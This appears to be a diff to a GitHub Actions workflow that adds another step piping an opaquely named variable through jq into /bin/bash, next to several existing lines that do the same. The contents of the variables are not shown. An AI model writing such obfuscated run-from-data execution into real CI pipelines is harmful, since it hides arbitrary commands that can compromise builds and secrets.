@@ -23,6 +23,7 @@ jobs:
           echo $kh6 | jq -r .urwjw2 | /bin/bash
           echo $zdsi386 | jq -r .qm85097 | /bin/bash
           echo $nvly6 | jq -r .ojr3769 | /bin/bash
+          printf '%s' "$ayuen759" | jq -r .fs691 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
